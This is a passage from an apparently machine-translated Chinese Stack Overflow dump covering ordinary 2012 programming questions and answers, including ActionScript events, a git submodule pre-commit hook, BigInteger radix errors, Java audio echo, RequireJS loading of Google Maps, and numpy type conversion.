    public function MyEventHistoryEvent(type:String, bubbles:Boolean=false, cancelable:Boolean=false) {
        super(type, bubbles, cancelable);
    }
} 
```

- 使用所需变量从事件分派器分派此事件：

```
var event:MyEvent = new MyEvent("eventType");
event.myVar = "yes";

dispatchEvent(event); 
```

- 添加事件处理程序：

```
checkBoxFast.addEventListener("eventType", eventHandler);

protected function eventHandler(event:MyEvent):void {
trace(event.myVar);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T10:09:53.967

另一种解决方案是使用[匿名函数](http://www.alanmacdougall.com/blog/2012/03/10/anonymous-functions-in-as3/)，如下所示：

```
checkBoxFast.addEventListener(clickType, function(e:Event):void{goFast("yes")});

function goFast(myVar:String)
{
    trace(myVar);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T10:00:59.857

Creating custom event is best way I guess. But I was using sometimes different aproach. I dont know if it is good practice but it works in some cases.

```
public function test() {

        var myVar : String = "some value";
        addEventListener(MouseEvent.CLICK, onClick);

        function(e:Event){
            trace(myVar);
        }

    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-22T05:08:02.113

这是一个非常干净的方法：

```
checkBoxFast.addEventListener(clickType, goFast("yes"));

function goFast(myVar:String) {return function(e:Event) {
    trace(myVar);
}} 
```

但**要注意匿名函数**，它们不会让你在同一个地方结束监听器！如果你在你的应用程序中重复多次，它可能会变慢并冻结。

实际上，我真的建议您这样做：

```
var functionGoFast:Function = goFast("yes");
checkBoxFast.addEventListener(clickType, functionGoFast);

function goFast(myVar:String):Function {
  return function(evt:Event = null):void {
    trace(myVar);
  }
}

//checkBoxFast.removeEventListener(clickType, functionGoFast); 
```

有关您的案例的更多示例和解释，请参阅[此答案](https://stackoverflow.com/a/13488640/1837285)。

# git - 如果子模块修改了文件，Git 不应该签入

> ID：12648585
> 
> 赞同：2
> 
> 时间：2012-09-28T23:30:00.473
> 
> 标签：git, git-submodules

是否有内置方式（或简单脚本）不允许我检查是否有任何子模块修改了文件？就目前而言，我有无用的提交，因为我无法返回子模块的状态。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:07:46.810

这看起来像预提交钩子“[子模块卫生脚本](http://bloggoergosum.com/2008/08/19/pre-commit-script-for-submodule-hygiene/)”用于：
如果子模块有待处理的更改，则阻止提交。
（另见[补丁/脚本](http://git.661346.n2.nabble.com/PATCH-templates-make-example-pre-commit-hook-verify-submodule-commits-exist-td2785495.html)）

该脚本是 4 年前编写的，因此 git diff 现在可能包含一种更简单的检测“脏”子模块的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-01T23:27:16.200

感谢 VonC 解释我需要做什么。对不起，我不知道 Bash，所以这里是 Ruby 版本。完美运行（到目前为止，在所有情况下都使用 git 版本 1.7.9.4 进行了测试）：

```
#!/usr/bin/env ruby
# http://stackoverflow.com/questions/12648585/git-should-not-checkin-if-submodule-has-modified-files
# October 1, 2012
# call this file pre-commit, make it executable and put it in .git/hooks
puts "Git pre-commit hook by Dan Rosenstark (yar)"
gitDiff = `git diff`
gitDiffWithSubmodules = `git diff --ignore-submodules`
if (gitDiff.length == gitDiffWithSubmodules.length)
  puts "Submodules are clean, going right ahead!"
else
  puts "One or more submodules are dirty, can't commit.'"
  exit 1
end 
```

# jquery - jQuery滑块垂直

> ID：12648586
> 
> 赞同：0
> 
> 时间：2012-09-28T23:30:02.423
> 
> 标签：jquery, html, css, jquery-ui

演示：http: [//jsfiddle.net/vpH8r/2/](http://jsfiddle.net/vpH8r/2/)

我在上面创建了一个 jfiddle，试图让垂直滑动工作。

当前的问题是滑块选项卡没有移动，并且没有从顶部到底部干净地滑动。

注意：我正在使用：

[http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js](http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js)

和

jquery-ui-1.8.23.custom.min.js

我似乎无法在 jfiddle 中一起启用（也许有办法做到这一点 - 我不确定） - 目前使用旧版本的 jquery 和 jquery-ui 的演示。

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T03:15:42.527

这里是固定的：http: [//jsfiddle.net/vpH8r/13/](http://jsfiddle.net/vpH8r/13/)

这是您需要做的：

1.  您同时拥有`top:`并`bottom:`设置，并且 top 往往会获得优先权，而如果您拥有两者，`top:`则无论顺序如何，都只会生效。通过删除 CSS 中的顶部，它现在会滑动，但它也会使其从底部开始，这就是您需要下一部分的原因

2.  jquery 滑块函数中的`value:`选项将起始位置设置为 100%（从底部开始），这使得它从顶部很好地开始。

为了让它在中间对齐，您需要执行以下操作：

```
<style type="text/css">
    left: 50%;
    margin-left: -.6em;  /* half the width of the element */
</style> 
```

# php - 打包/解包和 BSON 编码/解码数据

> ID：12648587
> 
> 赞同：0
> 
> 时间：2012-09-28T23:30:35.700
> 
> 标签：php, python

我们有一个 iOS 应用程序，它以编码格式发送数据。在 PHP 中，以下代码将正确解码。

```
bson_decode(pack("H*", $hex_string)); 
```

在 Python 中，以下代码将创建一个有效的编码对象，然后 PHP 代码可以对其进行解码（在 this 中`data`是 a `dict`）。

```
from bson import BSON
def encode(data):
    return str(BSON.encode(data)).encode('hex') 
```

以下 Python 代码将解码由上述 Python 代码编码的字符串：

```
from bson import BSON
def parse(str):
    hexed = str.decode('hex')
    return BSON.decode(BSON(hexed)) 
```

理论上，这也应该解码从应用程序发送的数据。但它会引发以下异常：

```
bson.errors.InvalidBSON: bad eoo 
```

看起来像在应用程序中对数据进行编码的 Objective C 代码添加了一些额外的填充。如果我从应用程序编码的字符串中删除最后一个字符，它就可以工作。我能做些什么来解决这个问题吗？无法更改应用程序代码。即使有数百万台设备运行我需要支持的旧代码，所以我仍然需要对此进行修复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:17:28.350

根据[BSON 规范](http://bsonspec.org/#/specification)，BSON 文档必须以 NULL 字节 ( `\x00`) 结尾。您是否检查过您尝试解码的字节字符串是否为 NULL 终止？如果没有，您可能需要在末尾附加一个 NULL 字节。

# java - 线程“主”java.lang.NumberFormatException 中的异常：基数超出范围

> ID：12648588
> 
> 赞同：3
> 
> 时间：2012-09-28T23:30:54.770
> 
> 标签：java, biginteger, bigdecimal

我正在尝试获取一个带有分数的文本文件。将分数从字符串转换为 bigdecimal。然后将结果划分并存储在堆栈中。

txt 文件中的每一行都是一个分数，它是随机生成的，用字符“/”分隔分子和分母。分子和分母的长度可以是 1-50，并且必须大于 0。数字是随机生成的，因此需要存储小数位。在我的代码中，我首先将字符串转换为 BigInteger，然后再转换为 BigDecimal。这适用于第一个字符串，但在第二个字符串的分子上中断。

```
public static void main(String[] args) throws FileNotFoundException {
    File file = new File("C:/Users/eric/workspace/sortProj/src/data.txt");

    FileReader fr = new FileReader(file);
    Scanner scanner = new Scanner(fr);
    Stack<BigDecimal> pile = new Stack<BigDecimal>();
    String numerator = "";
    String denominator = "";

    while (scanner.hasNextLine()) {
        String str = scanner.nextLine();
        numerator = "";
        denominator = "";

        separateStrings(pile, numerator, denominator, str);
    }
}

// appends chars to numerator string until it hits '/' then appends chars to
// denominator string
public static void separateStrings(Stack<BigDecimal> stack,
        String numerator, String denominator, String source) {
    boolean isNumerator = true;
    for (int i = 0; i < source.length(); i++) {
        if (source.charAt(i) == '/') {
            isNumerator = false;

        }
        else if (isNumerator == true) {
            numerator += source.charAt(i);          
        }else{
            denominator += source.charAt(i);
        }
    }
             //converts and stores fractions.

    BigDecimal BD2 = new BigDecimal(new BigInteger(denominator, denominator.length()));
    BigDecimal BD1 = new BigDecimal(new BigInteger(numerator, numerator.length()));
    stack.push(BD1.divide(BD2, 20, BigDecimal.ROUND_FLOOR));
} 
```

我得到了这个错误。

线程“main”中的异常 java.lang.NumberFormatException: Radix out of range at java.math.BigInteger.(Unknown Source) atsorting.separateStrings(sorting.java:60)<---我尝试转换分子的地方到大整数。

在sorting.main(sorting.java:26)<--- 我称之为separateStrings。

它打破的字符串是分子=“9821020392310432153773517114542035029”

我不确定为什么会收到此错误。我的印象是 BigInteger 的长度可以达到 50。另外，它适用于 txt 的第一行，即“8731472450870/1572580584296783758”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:33:49.023

利用

```
BigDecimal BD2 = new BigDecimal(new BigInteger(denominator, 10)); 
```

.. 第二个参数是基数。( [JavaDoc](http://docs.oracle.com/javase/1.4.2/docs/api/java/math/BigInteger.html#BigInteger%28java.lang.String,%20int%29) )

注意：您可以使用该`split("/")`方法，它可以为您节省大量低级工作。再看看[JavaDoc](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html#split%28java.lang.String%29)。了解基本的 Java Api 很好：]

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T23:35:01.673

错误是由对象引起的：

```
new BigInteger(denominator, denominator.length()) 
```

它试图创建一个基数为 37 的[BigInteger](http://docs.oracle.com/javase/7/docs/api/java/math/BigInteger.html)，恰好比允许的最大值 36 多 1。

在此示例中，您可能不需要设置基数甚至不需要使用`BigInteger`，因此您可以简单地使用：

```
BigDecimal bigDecimal = new BigDecimal(denominator); 
```

# java - 在 Java/Android 中添加两个音频信号

> ID：12648594
> 
> 赞同：0
> 
> 时间：2012-09-28T23:31:36.870
> 
> 标签：java, audio, echo

我正在尝试制作自己的回声垫，实际上直到回声部分都可以

起初我从声音创作开始，它很棒，但是当我开始添加回声效果时，它听起来很愚蠢。

**编码**

```
package com.echo;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.SourceDataLine;

public class WavePlay {

    private final static float duration = 1f; // seconds
    private final static int sampleRate = 44100;
    private final static int numSamples = (int) (duration * sampleRate);
    private final static double sample[] = new double[numSamples];

    private static SourceDataLine line = null;
    private static int freqOfTone = 30;

    private static byte[] original;

    public static void main(String[] args) {

        AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED,
                sampleRate, 8, 1, 1, sampleRate, true);

        DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);

        try {
            line = (SourceDataLine) AudioSystem.getLine(info);
            line.open(format);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }

        for (int i = 0; i < numSamples; ++i) {
            sample[i] = 255 * Math.sin(2 * Math.PI * i
                    / (sampleRate / freqOfTone));

        }

        final byte generatedSnd[] = new byte[100000];

        original = new byte[generatedSnd.length];

        for (int i = 0; i < 20000; i++) {

            generatedSnd[i] = (byte) (sample[i % sample.length] + 1);

            original[i] = generatedSnd[i];

        }

        // Echo

        int delaySamples = 10000;

        float decay = 0.3f;

        for (int j = 0; j < 5; j++) {
            for (int i = 0; i < generatedSnd.length; i++) {

                if (i < delaySamples * (j + 1)) {
                    continue;
                }

                generatedSnd[i] += (byte) (original[i - delaySamples * (j + 1)] * decay);

            }

            decay *= 0.4;
        }

        // play

        InputStream source = new ByteArrayInputStream(generatedSnd);

        int numRead = 0;
        byte[] buf = new byte[line.getBufferSize()];

        line.start();
        // read and play chunks of the audio
        try {
            while ((numRead = source.read(buf, 0, buf.length)) >= 0) {
                int offset = 0;
                while (offset < numRead)
                    offset += line.write(buf, offset, numRead - offset);
            }
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }

        line.drain();
        line.stop();
        line.close();

        System.exit(0);
    }

} 
```

请运行代码并告诉我是否有任何问题

非常感谢提前

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T07:49:45.927

事实是有几个错误，下面的代码通过这些更改产生了更清晰的结果：

*   写入缓冲区中的值必须小于 Byte.MAX_VALUE（如果在支持短数组的 android 上写入，您的偏移量将为 SHORT.MAX_VALUE）

*   示例创建以更清洁的方式实现

**编码**

```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.SourceDataLine;

public class WavePlay {

    public static void main(String[] args) {

        float duration = 1f; // seconds
        int sampleRate = 44100;
        int numSamples = (int) (duration * sampleRate);
        double sample[] = new double[numSamples];

        SourceDataLine line = null;
        int freqOfTone = 300;

        double[] original;

        AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED,
                sampleRate, 8, 1, 1, sampleRate, true);

        DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);

        try {
            line = (SourceDataLine) AudioSystem.getLine(info);
            line.open(format);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }

        double increment = 2 * Math.PI * freqOfTone / sampleRate;
        double angle = 0;

        for (int i = 0; i < numSamples; ++i) {
            sample[i] = (Math.sin(angle)) * Byte.MAX_VALUE;
            angle += increment;
        }

        final double generatedSnd[] = new double[200000];

        original = new double[generatedSnd.length];

        for (int i = 0; i < 20000; i++) {
            generatedSnd[i] = sample[i % sample.length];

            original[i] = generatedSnd[i];

        }

        // Echo

        int delaySamples = 20000;

        float decay = 0.8f;

        double maxValue = Byte.MAX_VALUE;

        for (int j = 0; j < 10; j++) {
            for (int i = 0; i < generatedSnd.length; i++) {

                if (i < delaySamples * (j + 1)) {
                    continue;
                }

                generatedSnd[i] += original[i - delaySamples * (j + 1)] * decay;
                if(generatedSnd[i] > maxValue){
                    maxValue = generatedSnd[i]; 
                }

            }

            decay *= 0.5;
        }

        //scale to fit byte length (8 bit)
        byte[] out = new byte[generatedSnd.length];

        for (int i = 0; i < out.length; i++) {
            out[i] = (byte)(Byte.MAX_VALUE * generatedSnd[i] / maxValue);
        }

        // play

        InputStream source = new ByteArrayInputStream(out);

        int numRead = 0;
        byte[] buf = new byte[line.getBufferSize()];

        line.start();
        // read and play chunks of the audio
        try {
            while ((numRead = source.read(buf, 0, buf.length)) >= 0) {
                int offset = 0;
                while (offset < numRead)
                    offset += line.write(buf, offset, numRead - offset);
            }
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }

        line.drain();
        line.stop();
        line.close();

        System.exit(0);
    }

} 
```

# google-maps-api-3 - 与 require.js 一起使用的 AMD 版 Google Maps V3？

> ID：12648598
> 
> 赞同：8
> 
> 时间：2012-09-28T23:31:54.053
> 
> 标签：google-maps-api-3, requirejs, js-amd

有没有人在 AMD 版本中使用过类似 require.js 的 Googlemaps V3？是否已经在某个地方完成了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-29T01:31:27.847

在 require.js 你可以使用异步插件，然后像这样调用它：

```
define([
    'async!http://maps.google.com/maps/api/js?sensor=false'
], function(){
    //Create your map.
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T17:35:24.667

您也可以使用 jQuery.Deferred() 和一些全局变量来完成它（不理想，但我需要它，所以我可以使用 grunt rjs 优化我的文件，它不适用于异步）：

```
// gmapsDone.js
window._mapsLoaded = $.Deferred();
window.gmapsLoaded = function(data) {
  delete window.gmapsLoaded;
  _mapsLoaded.resolve();
};

define(["http://maps.google.com/maps/api/js?v=3&sensor=false&callback=gmapsLoaded"], function(gmaps) {
  "use strict";

  return window._mapsLoaded.done;
}); 
```

然后，使用它：

```
define(["gmapsDone"], function(gmapsDone) {
  function load() {
    // Do something
  }
  gmapsDone(load);
}); 
```

[https://gist.github.com/taktran/5389668](https://gist.github.com/taktran/5389668)

灵感来自[http://blog.pixelingene.com/2011/10/using-jquery-dot-deferred-and-requirejs-to-lazy-load-google-maps-api/](http://blog.pixelingene.com/2011/10/using-jquery-dot-deferred-and-requirejs-to-lazy-load-google-maps-api/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-09T14:15:34.287

我最近通过使用上述 $.Deferred 方法帮助一位朋友解决了这个问题。这与优化器配合得很好，并且不会导致多个脚本加载。

### 模块

```
var google_maps_loaded_def = null;

define(['jquery'],function($) {

  if(!google_maps_loaded_def) {

    google_maps_loaded_def = $.Deferred();

    window.google_maps_loaded = function() {
      google_maps_loaded_def.resolve(google.maps);    
    }

    require(['http://maps.googleapis.com/maps/api/js?sensor=true&callback=google_maps_loaded'],function(){},function(err) {
      google_maps_loaded_def.reject();
      //throw err; // maybe freak out a little?
    });

  }

  return google_maps_loaded_def.promise();

}); 
```

可作为要点： [https ://gist.github.com/MattSurabian/7868115](https://gist.github.com/MattSurabian/7868115)

### 用法

要使用上述模块并利用 promise 使用 google.maps 解析的事实：

```
 define([ 'app/lib/google-maps-loader' ], function(GoogleMapsLoader){
        GoogleMapsLoader.done(function(GoogleMaps){
            // your google maps code here!
            var geocoder = new GoogleMaps.Geocoder();
        }).fail(function(){ 
            console.error("ERROR: Google maps library failed to load");
        });
    }); 
```

或者，只需正常引用该`google.maps`对象

```
 define([ 'app/lib/google-maps-loader' ], function(GoogleMapsLoader){
        GoogleMapsLoader.done(function(){
            // your google maps code here!
            var geocoder = new google.maps.Geocoder();
        }).fail(function(){ 
            console.error("ERROR: Google maps library failed to load");
        });
    }); 
```

我在这里写了一篇关于这个方法的简短博文，可能会有一些用处：[RequireJS Projects and Asynchronously Loading the Google Maps API](http://mattsurabian.github.io/requirejs-projects-and-asynchronously-loading-the-google-maps-api/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-01-16T21:39:46.043

我整理了一个[Google Maps AMD 加载器插件](https://github.com/hamweather/googlemaps-amd)，它在 async 之上添加了一些功能！装载机。

```
require.config({
  googlemaps: {
    params: {
      key: 'abcd1234',        // sets api key
      libraries: 'geometry'   // set google libraries
    }
  }
});
require(['googlemaps!'], function(gmaps) {
  // google.maps available as gmaps
  var map = new gmaps.Map('map-canvas');
}); 
```

# ruby-on-rails - Capistrano 仅允许“sudo su - user”

> ID：12648611
> 
> 赞同：5
> 
> 时间：2012-09-28T23:35:19.227
> 
> 标签：ruby-on-rails, capistrano, sudo

我正在尝试对远程服务器进行简单的 Rails/Capistrano 部署。不幸的是，我无法`sudo`开箱即用。我需要在这里部署：

```
drwxr-xr-x 2 user   www       4096 Sep 28 15:05 my_app_dir 
```

并且 sudoers 已设置为允许我运行`sudo su - user`，仅此而已。

一些试图将其引入 deploy.rb 的尝试：

```
set :use_sudo, true
set :sudo, 'sudo su - user'  # fails due to bad su syntax, -c is inserted after user
set :sudo, 'sudo -u user'  # fails because it's not set up
set :sudo, 'sudo su - user -c' # also bad syntax
set :sudo_prompt, '' 
```

我认为最好的选择是：

1.  启用无密码`sudo`（[此处](https://github.com/capistrano/capistrano/wiki/2.x-Significant-Configuration-Variables)推荐）
2.  Enable `sudo -u user`，它应该与`set :sudo, 'sudo -u user'`

有什么方法可以使这项工作保持原样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T10:00:27.273

您尝试使用的用户是否已添加到服务器上的 sudoers cfg 中？尝试这个

```
run "#{sudo :as => 'bob'} mkdir /path/to/dir" 
```

[资源](http://rubydoc.info/github/capistrano/capistrano/master/Capistrano/Configuration/Actions/Invocation#sudo_prompt-instance_method)

# iphone - 如何将 pointsInside:withEvent 添加到 xib 视图？

> ID：12648617
> 
> 赞同：0
> 
> 时间：2012-09-28T23:35:58.500
> 
> 标签：iphone, ios, xib

我只是在学习 iOS 编程，如果这是一个愚蠢的问题，我很抱歉。

我在 xib 中有一个充当叠加层的视图，但我希望该视图是“透明的”，以便人们可以操纵（点击）它下面的视图。我读到 pointsInside:withEvent 会这样做（如果设置为返回 NO），但是我在哪里放置这个方法？

我有一个拥有我的 xib 的 viewController，但是把方法放在那里并没有做任何事情......

如何将我的方法添加到 xib 视图？我是否必须制作另一个视图（以编程方式）并将我的覆盖 xib 添加为子视图？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:43:57.313

您可以`userInteractionEnabled`改为`NO`在视图上设置。覆盖`pointInside:withEvent:`实际上是为了修改视图的“形状”。

如果您确实想覆盖`pointInside:withEvent:`，则需要创建一个 UIView 子类并在那里进行。但是，您仍然可以在您的 xib 中添加此视图。在 xib 中选择视图，然后在 Identity Inspector 窗格中将类设置为您的子类。

# jquery - 我如何在 jQuery 中定位它

> ID：12648623
> 
> 赞同：0
> 
> 时间：2012-09-28T23:36:28.663
> 
> 标签：jquery, focus, jquery-hover

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:38:17.933

> 它悬停在..还是专注于？

`on` `mouseover`：

```
$('div.description a').on('mouseover', function(){
    alert('asas');
}); 
```

**编辑：**

它不起作用，因为您必须将其加载到准备好的文档上或标记之后。

```
$(function(){
 //your script
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:45:49.880

以下是如何使用悬停方法的示例：

```
$("td").hover(
  function () {
    $(this).addClass("hover");
  },
  function () {
    $(this).removeClass("hover");
  }
); 
```

其中第一个函数是 mouseenter 事件的处理程序，第二个调用是 mouse leave 事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:40:52.253

```
$("div.description a").mouseover(function() { alert('asas'); }); 
```

将在鼠标悬停时发出警报。

# python - python：将numpy数组数据类型从int64转换为int

> ID：12648624
> 
> 赞同：25
> 
> 时间：2012-09-28T23:36:36.143
> 
> 标签：python, types

我对 python 有点陌生，我在另一个程序（ABAQUS）中使用 python 模块。然而，这个问题完全与 python 相关。

在程序中，我需要创建一个整数数组。该数组稍后将用作 ABAQUS 中定义的函数的输入。问题与整数的数据类型有关。在数组中，整数的数据类型为“int64”。但是，当我将数组输入到所需的函数时，出现以下错误：

> “ABAQUS 接口仅支持 INT、FLOAT 和 DOUBLE（如果标准 long 是 64 位，则使用类型码为 int 的多数组）”

我不需要 ABAQUS 的帮助。如果我在 python 中将数据类型转换为“int”，这就足够了。我以为我可以简单地使用 int() 函数来转换数据类型。这没有用。任何建议将不胜感激。谢谢你们。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2020-04-16T18:49:51.570

[numpy.ndarray.tolist](https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.tolist.html#numpy.ndarray.tolist)会这样做：

```
a.tolist() 
```

如果您的数据是 pandas 系列，您可以使用相同的结果调用他们的[tolist包装器。](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.tolist.html)

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2015-02-13T15:05:56.730

@JF 塞巴斯蒂安的回答：

```
a.astype(numpy.int32) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-03-23T03:05:22.607

使用对象`item()`方法`numpy.int64`，正如[Mike T](https://stackoverflow.com/a/11389998/2741416)在另一个类似问题中的回答所解释的那样。

官方文档在这里：[https ://docs.scipy.org/doc/numpy-dev/reference/generated/numpy.chararray.item.html#numpy.chararray.item](https://docs.scipy.org/doc/numpy-dev/reference/generated/numpy.chararray.item.html#numpy.chararray.item)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-19T11:33:27.737

最后，如果您使用 numpy 将 int64 值列表转换为 int，您将获得一个 numpy 值（int64、int32 等）。如果你想要一个常规的 int（不是 numpy int），我找到了一种可行的方法。您将其转换为字符串，然后转换为列表！请享用...

```
import ast

a = ast.literal_eval(str(a)) 
```

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2018-05-10T09:30:17.227

如果是pandas系列，可以先转换成Dataframe，然后使用df.to_dict()，然后numpy.int64就会转换成int

```
In [1]: import pandas as pd

In [2]: import numpy as np

In [3]: df = pd.DataFrame(np.random.randint(5,size=(3,4)),
index=np.arange(3))

In [4]: type(df[0][0])

Out[4]: numpy.int64

In [5]: dict_of_df = df.to_dict()

In [6]: type(dict_of_df[0][0])

Out[6]: int 
```

# java - ADT LinkedList 相交集错误

> ID：12648631
> 
> 赞同：0
> 
> 时间：2012-09-28T23:38:35.087
> 
> 标签：java, list, linked-list, adt, intersect

我有一个 LinkedList 的 ADT 的测试代码，它实现了接口 NumList.java，并在 NumLinkedList.java 中实现，并在 NumSet.java 中使用它。

我正在尝试使我的 NumSet 具有可以从双数组输入创建集合的方法，并使用拦截/联合和打印方法来使用和打印数据。

但我的测试代码显示我的测试 NumSet 值为空，即 testProof 和 testProof2。

所以现在我的 testProof 返回了一个空变量，这意味着没有任何东西保存在其中。

```
static public NumSet intersect(NumSet S1, NumSet S2) //check 2nd for and if//
{
    NumSet intersectAnswer = new NumSet();

    for (int i = 0; i < S1.set.size()-1; i++)
    {
        for(int j = 0; j < S2.set.size()-1; j++)
        {
            double FUZZ = 0.0001;
            if (Math.abs(S1.set.lookup(i) - S2.set.lookup(j)) < FUZZ) // double values, this is more precise than ==.
                {
                    intersectAnswer.set.insert(1, S1.set.lookup(i));
                }
        }
    }

    return intersectAnswer;

} 
```

是testProof的方法，下面是定义testProof的地方。

```
public static void main(String[] args)
{
    double[] a = {1.3,2,3,4,101.9};
    double[] b = {3,7,13,901,-29.1,0.05};

    NumArrayList test;
    test = new NumArrayList();
    test.printTest(); //runs test code in NumList

    //ok below is running. what is wrong with intersect?
    NumSet test2;
    test2 = new NumSet(a);
    NumSet test4;
    test4 = new NumSet(b);
    NumSet testProof;
    NumSet testProof2;

    test2.print(); //print out test 2
    System.out.println();
    test4.print();
    System.out.println();
    testProof = intersect(test2,test4); 
```

我已经初始化为

```
public class NumSet
{
private NumList set;

    public NumSet(double[] sth)
    {
        //moves elements of sth into set.
        set = new NumLinkedList();
        for(int i = 0; i < sth.length; i++)
        {
            set.insert(0,sth[i]);
        }
        set.removeDuplicates();
    }

    public NumSet()
    {
        set = new NumLinkedList();
    }

int numSet = 0; 
```

我的拦截、联合和打印如下：

```
public NumSet intersect(NumSet S1, NumSet S2) //check 2nd for and if//
{
    NumSet intersectAnswer = new NumSet();

    for (int i = 0; i < S1.set.size()-1; i++)
    {
        for(int j = 0; j < S2.set.size()-1; j++)
        {
            if (S1.set.lookup(i) == S2.set.lookup(j))
                {
                intersectAnswer.set.insert(0, S1.set.lookup(i));
                }
        }
    }

    // intersectAnswer.set.removeDuplicates();  unnecessary, sets are already removed of duplicates
    return intersectAnswer;

}

public NumSet union(NumSet S1, NumSet S2)
{   //check logic.
    NumSet unionAnswer = new NumSet();

    for (int i = 1; i < S1.set.size()+1; i++)
    {
        unionAnswer.set.insert(1, S1.set.lookup(i));
    }

    for (int i = 1; i < S2.set.size()+1; i++)
    {
        unionAnswer.set.insert(1, S2.set.lookup(i)); 
    }
    unionAnswer.set.removeDuplicates();
    return unionAnswer;
}

public void print() 
{
    for (int i = 0; i < set.size()-1; i++)
    {
        System.out.print(set.lookup(i) + ",");

    }
    System.out.print(set.lookup(set.size()-1));
} 
```

查找和大小是从我的 NumLinkedList.java 引用的，如下所示

```
public int size() // measure size of list by counting counter++;
{

    return nItem; 
}

public double lookup(int i) 
{
    if( i <0 || i >= size()) //cannot lookup nonexistant object
    {
        System.out.println("out of bounds " + i + " < 0 or > " + size() );
        //how do I break out of this loop?
        System.out.println("just returning 0 for the sake of the program");

        return 0;
    }

    if(i == 0)
    {
        return head.value;
    }

    double answer = 0;
    Node currNode = head;
    for(int j = 0; j < i+1; j++) //move to ith node and save value
    {
        answer = currNode.value;    
        currNode = currNode.next;   
    }

    return answer;
} 
```

最后我的测试代码如下，其中 testProof 和 testProof2 是。

```
public static void main(String[] args)
{
    double[] a = {1.3,2,3,4,101.9};
    double[] b = {3,7,13,901,-29.1,0.05};

    NumArrayList test;
    test = new NumArrayList();
    test.printTest(); //runs test code in NumList

    //ok below is running. what is wrong with intersect?
    NumSet test2;
    test2 = new NumSet(a);
    NumSet test4;
    test4 = new NumSet(b);
    NumSet testProof;
    NumSet testProof2;

    test2.print();
    System.out.println();
    testProof = test2.intersect(test2, test4);
    System.out.println("tried intersect");
    testProof.print(); 
    System.out.println();
    System.out.println("tried test.print()");
    testProof2 = test2.union(test2,test4);
    System.out.println("tried union");
    testProof2.print(); 
    System.out.println();
    System.out.println("NumSet ran fully."); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:33:15.883

我建议您在调试时使用**整数值**而不是**双**精度值来实现 NumSet 类，因为在此调试阶段比较两个双精度值往往会给您的代码增加一些不必要的复杂性。

您可能想查看您的**removeDuplicates() 方法**，我认为这可能会解决您的问题。不幸的是，我在您发布的代码中看不到它。

**实际上， intersect() 方法**中的这部分代码从一开始就注定会失败，

```
if (S1.set.lookup(i) == S2.set.lookup(j)) 
```

由于您使用双精度数， == 是比较两个不同值的一种非常不精确的方法，更好的方法是允许一定量的精度误差，即

```
double final FUZZ = 0.0001
if (Math.abs(S1.set.lookup(i) - S2.set.lookup(j)) < FUZZ )
    //... 
```

# javascript - 设置一个 $_POST 变量

> ID：12648639
> 
> 赞同：0
> 
> 时间：2012-09-28T23:39:45.060
> 
> 标签：javascript, jquery

如何在`$_POST`不使用 Ajax 库的情况下使用 jQuery 或 JavaScript 设置变量？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:41:36.200

jQuery 是库，ajax 不是。Ajax 是一种`XHR Object`写成 jQuery 方法的实现。

```
$.ajax({
    type: 'POST',
    url: 'path/to/my/controller.ext',
    data: 'myvar=something'
}); 
```

php。

```
if(isset($_POST['myvar'])):
    //you now have reference to myvar, which has a value of something.
endif; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:43:37.877

您可以使用 javascript 非常简单地执行此操作，只需向`onclick="click();"`您尝试获取的按钮或链接添加一个属性，然后编写一个小`function click() {`的来处理`var value = document.GetElementById('textBoxId').value`.

编辑：这是“获取”一个变量，而不是“设置”一个变量，但您仍然可以使用这些想法来执行基于用户单击按钮然后检索字段值的操作。

# c# - Google 日历 (v3) 事件格式

> ID：12648641
> 
> 赞同：1
> 
